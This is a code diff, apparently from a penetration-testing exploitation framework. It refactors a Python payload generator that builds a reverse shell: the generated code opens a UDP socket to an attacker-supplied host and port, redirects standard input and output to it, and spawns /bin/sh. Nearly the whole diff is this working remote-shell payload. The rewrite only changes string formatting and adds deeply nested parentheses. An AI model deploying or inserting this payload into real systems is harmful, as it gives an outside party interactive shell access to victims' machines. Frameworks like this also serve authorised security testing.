@@ -22,14 +22,21 @@ class Payload(ReverseTCPPayloadMixin, GenericPayload):
 
     def generate(self):
         return (
-            "import os\n" +
-            "import pty\n" +
-            "import socket\n" +
-            "s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n" +
-            "s.connect(('{}',{}))\n".format(self.lhost, self.lport) +
-            "os.dup2(s.fileno(), 0)\n" +
-            "os.dup2(s.fileno(), 1)\n" +
-            "os.dup2(s.fileno(), 2)\n" +
-            "pty.spawn('/bin/sh');\n" +
-            "s.close()\n"
-        )
+            (
+                (
+                    (
+                        (
+                            "import os\n"
+                            + "import pty\n"
+                            + "import socket\n"
+                            + "s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+                            + f"s.connect(('{self.lhost}',{self.lport}))\n"
+                        )
+                        + "os.dup2(s.fileno(), 0)\n"
+                    )
+                    + "os.dup2(s.fileno(), 1)\n"
+                )
+                + "os.dup2(s.fileno(), 2)\n"
+            )
+            + "pty.spawn('/bin/sh');\n"
+        ) + "s.close()\n"
